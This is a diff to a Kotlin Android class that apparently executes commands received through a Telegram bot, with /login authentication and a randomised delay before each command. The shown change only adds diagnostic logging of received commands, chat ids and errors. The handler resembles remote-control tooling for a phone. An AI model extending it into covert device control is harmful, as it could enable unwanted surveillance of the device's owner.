@@ -31,6 +31,7 @@ import kotlin.random.Random
  * - إضافة دالة مساعدة للتحقق من الجلسة مع تمرير monitor كمعامل.
  * - جعل دالة ex suspend للتوافق مع دالة execute suspend.
  * - تنويع الإيموجي في لوحة الأزرار لجعل كل زر فريداً.
+ * - ✅ إضافة سجلات تشخيصية مفصلة في execute لمعرفة الأوامر المستلمة.
  */
 class Commands private constructor(context: Context) {
 
@@ -473,9 +474,14 @@ class Commands private constructor(context: Context) {
      * - منع الأوامر النصية العشوائية.
      * - استثناء /login فقط للمصادقة النصية.
      * - إضافة تأكيد استلام الضغطة (answerCallbackQuery).
+     * - ✅ إضافة سجلات تشخيصية مفصلة لتتبع الأوامر.
      */
     suspend fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
         try {
+            // ✅ سجل تشخيصي لمعرفة الأمر المستلم
+            MainActivity.appendLogStatic("⚡ Executing command: '$cmd' from $cid")
+            Log.d(TAG, "⚡ Executing command: '$cmd' from $cid")
+
             if (cmd.isBlank()) return
             delay(Random.nextLong(300, 900))
 
@@ -534,10 +540,12 @@ class Commands private constructor(context: Context) {
                 }
 
                 else -> {
+                    MainActivity.appendLogStatic("⚠️ Unknown command: '$cmd'")
                     sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية.")
                 }
             }
         } catch (e: Exception) {
+            MainActivity.appendLogStatic("❌ Command error: ${e.message}")
             Log.e(TAG, "❌ Command error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ: ${e.message?.take(100)}")
         }
